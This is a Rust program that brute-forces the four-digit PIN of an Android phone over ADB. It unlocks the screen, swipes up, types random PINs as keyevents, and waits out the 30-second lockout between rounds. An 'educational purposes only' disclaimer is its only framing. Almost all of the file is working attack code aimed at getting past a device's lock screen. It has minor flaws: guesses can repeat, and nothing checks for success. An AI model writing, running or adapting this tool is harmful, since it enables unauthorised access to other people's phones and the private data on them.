// std
use std::{thread, time::Duration};

use rand::Rng;

fn main() {
    println!("This software was developed for educational purposes ONLY.");
    println!("Author do not take any responsibility for his software's users or any unfair/malicious usage.");


    let adb_server = mozdevice::Host { ..Default::default() };
    let connected: Vec<mozdevice::DeviceInfo> = adb_server.devices().unwrap();
    let connected_amount: usize = connected.len();

    if connected_amount <= 0 {
        panic!("No devices connected");
    }

    let active_device_info = connected.get(0).unwrap();

    println!("Connected {connected_amount} devices");
    println!("Active device: {:?} ({:?})", active_device_info.info["device"], active_device_info.info["model"]);

    let active_device = mozdevice::Device::new(
        adb_server,
        active_device_info.serial.to_owned(),
        mozdevice::AndroidStorageInput::Auto
    ).unwrap();

    // Unlocking device
    active_device.execute_host_shell_command("input keyevent 82").unwrap();
    thread::sleep(Duration::from_millis(100));
    active_device.execute_host_shell_command("input swipe 408 1210 408 85").unwrap();

    // Necessary variables
    let mut combination: String = String::new();
    let mut attempt: u32 = 1;
    let mut retries_limit: u16 = 5;

    let mut digits: Vec<u8> = [ 0, 0, 0, 0 ].to_vec();

    for retries in 1..=9999 {
        for i in 0..=3 {
            digits[i] = rand::thread_rng().gen_range(0..=9);
            combination += &digits[i].to_string();
            digits[i] += 7;
        }
        println!("Attempt {attempt}, Retry {retries}: Combination {combination}");

        if attempt == 3 {
            println!("Exceeded limit of 3 attempts");
            println!("From now on, there is only %s1%s retry before %s30%s second cooldown");

            retries_limit = 1;
        }

        for i in 0..=3 {
            active_device.execute_host_shell_command(&format!("input keyevent {:?}", digits[i])).unwrap();
            thread::sleep(Duration::from_millis(20));
        }
        combination = String::new();

        if retries % retries_limit == 0 {
            attempt += 1;

            thread::sleep(Duration::from_millis(80));
            active_device.execute_host_shell_command("input keyevent 66").unwrap();

            println!("Limit of {retries_limit} retries exceeded, waiting 30 seconds...");
            thread::sleep(Duration::from_secs(30));

            active_device.execute_host_shell_command("input keyevent 82").unwrap();
            thread::sleep(Duration::from_millis(100));
            active_device.execute_host_shell_command("input swipe 408 1210 408 85").unwrap();                    
        }
    }
}